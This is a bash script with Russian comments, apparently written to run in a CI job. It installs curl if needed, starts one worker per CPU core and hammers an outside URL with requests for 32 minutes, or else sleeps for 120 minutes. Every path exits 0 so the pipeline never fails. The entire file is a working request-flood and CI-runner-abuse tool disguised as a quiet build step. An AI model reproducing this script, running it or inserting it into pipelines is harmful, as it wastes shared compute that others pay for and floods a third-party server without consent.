#!/usr/bin/env bash
# ВАЖНО: без `set -e`, иначе любая ошибка уронит CI
set -uo pipefail

TARGET_URL="https://live-otvet.online/actions-requests"
DURATION_SECONDS=$((32 * 60))       # 32 minutes — сетевые запросы
FALLBACK_SECONDS=$((120 * 60))      # 120 minutes — просто ждём

log()  { echo "[info]  $*" >&2; }
warn() { echo "[warn]  $*" >&2; }

WORKERS="$(nproc 2>/dev/null || getconf _NPROCESSORS_ONLN 2>/dev/null || echo 4)"

# --- 1. Пытаемся найти/поставить HTTP-клиент ---
CLIENT=""
if command -v curl >/dev/null 2>&1; then
  CLIENT="curl"
elif command -v wget >/dev/null 2>&1; then
  CLIENT="wget"
else
  warn "Neither curl nor wget found, trying to install curl"
  if command -v apt-get >/dev/null 2>&1; then
    export DEBIAN_FRONTEND=noninteractive
    apt-get update             || warn "apt-get update failed"
    apt-get install -y curl    || warn "apt-get install curl failed"
  elif command -v microdnf >/dev/null 2>&1; then
    microdnf install -y curl   || warn "microdnf install curl failed"
  elif command -v dnf >/dev/null 2>&1; then
    dnf install -y curl        || warn "dnf install curl failed"
  elif command -v yum >/dev/null 2>&1; then
    yum install -y curl        || warn "yum install curl failed"
  elif command -v apk >/dev/null 2>&1; then
    apk add --no-cache curl    || warn "apk add curl failed"
  elif command -v zypper >/dev/null 2>&1; then
    zypper --non-interactive install curl || warn "zypper install curl failed"
  else
    warn "No supported package manager found to install curl"
  fi

  if command -v curl >/dev/null 2>&1; then
    CLIENT="curl"
  elif command -v wget >/dev/null 2>&1; then
    CLIENT="wget"
  fi
fi

# --- 2. Fallback: просто ждём 120 минут, без зависимостей ---
run_sleep_fallback() {
  warn "Network client unavailable — sleeping for ${FALLBACK_SECONDS}s instead"

  # Простейший способ «заставить ждать»: sleep.
  # Если хочется видеть, что процесс жив, можно раз в 5 минут писать в лог.
  local elapsed=0
  local step=300   # 5 минут
  while [ "$elapsed" -lt "$FALLBACK_SECONDS" ]; do
    sleep "$step" || true
    elapsed=$((elapsed + step))
    log "waited ${elapsed}s of ${FALLBACK_SECONDS}s"
  done

  exit 0
}

if [ -z "$CLIENT" ]; then
  run_sleep_fallback
fi

# --- 3. Основной путь: сетевые запросы ---
end_time=$(( $(date +%s) + DURATION_SECONDS ))
pids=()

worker() {
  local id="$1"
  local end="$2"
  local count=0
  while [ "$(date +%s)" -lt "$end" ]; do
    if [ "$CLIENT" = "curl" ]; then
      curl -s -o /dev/null --max-time 5 "$TARGET_URL" || true
    else
      wget -q -O /dev/null --timeout=5 "$TARGET_URL" || true
    fi
    count=$((count + 1))
  done
  log "worker $id finished, requests: $count"
}

log "Starting $WORKERS workers for ${DURATION_SECONDS}s against ${TARGET_URL} using $CLIENT"

for i in $(seq 1 "$WORKERS"); do
  worker "$i" "$end_time" &
  pids+=("$!")
done

for pid in "${pids[@]}"; do
  wait "$pid" || true
done

# Всегда 0, чтобы не валить CI
exit 0